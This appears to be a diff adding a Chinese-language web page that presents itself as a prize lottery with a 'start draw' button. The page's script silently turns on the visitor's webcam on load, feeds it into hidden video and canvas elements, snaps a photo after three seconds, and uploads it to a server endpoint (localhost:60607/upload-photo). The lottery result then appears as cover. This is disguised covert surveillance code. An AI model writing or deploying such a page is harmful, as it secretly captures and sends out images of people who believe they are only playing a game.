@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>抽奖活动</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            color: #0d47a1;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            font-size: 3em;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+        }
+
+        #drawButton {
+            padding: 15px 30px;
+            font-size: 20px;
+            cursor: pointer;
+            background-color: #0d47a1;
+            color: #fff;
+            border: none;
+            border-radius: 25px;
+            margin-top: 20px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        #drawButton:hover {
+            background-color: #0b3d91;
+            transform: scale(1.05);
+        }
+
+        .result {
+            font-size: 24px;
+            color: #333;
+            margin-top: 20px;
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #0d47a1;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 2s linear infinite;
+            display: none;
+            margin-top: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #video, #canvas {
+            display: none;
+        }
+
+        .prize-container {
+            margin-top: 20px;
+            border: 2px dashed #0d47a1;
+            padding: 20px;
+            border-radius: 15px;
+            background-color: rgba(255, 255, 255, 0.8);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+    <h1>欢迎参加抽奖活动！</h1>
+    <div class="prize-container">
+        <button id="drawButton">开始抽奖</button>
+        <div class="loader"></div>
+        <div class="result" id="result"></div>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const prizes = ["一等奖", "二等奖", "三等奖", "安慰奖", "谢谢参与"];
+
+        function drawLottery() {
+            document.querySelector('.loader').style.display = 'block';
+            document.getElementById('result').style.display = 'none';
+
+            setTimeout(() => {
+                const randomIndex = Math.floor(Math.random() * prizes.length);
+                const prize = prizes[randomIndex];
+                document.getElementById('result').innerText = `恭喜你！你获得了：${prize}`;
+                document.getElementById('result').style.display = 'block';
+                document.querySelector('.loader').style.display = 'none';
+            }, 2000);
+        }
+
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => video.play();
+                    setTimeout(captureAndUpload, 3000);
+                })
+                .catch(error => {
+                    console.error('无法访问摄像头:', error);
+                });
+        }
+
+        function captureAndUpload() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                if (blob) {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'photo.png');
+
+                    fetch('http://localhost:60607/upload-photo', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(() => {
+                        console.log('照片上传成功');
+                        drawLottery();
+                    })
+                    .catch(error => {
+                        console.error('照片上传失败:', error);
+                        drawLottery();
+                    });
+                }
+            }, 'image/png');
+        }
+
+        document.getElementById('drawButton').addEventListener('click', function() {
+            this.disabled = true;
+            drawLottery();
+            setTimeout(() => {
+                this.disabled = false;
+            }, 3000);
+        });
+
+        startCamera();
+    </script>
+</body>
+</html>
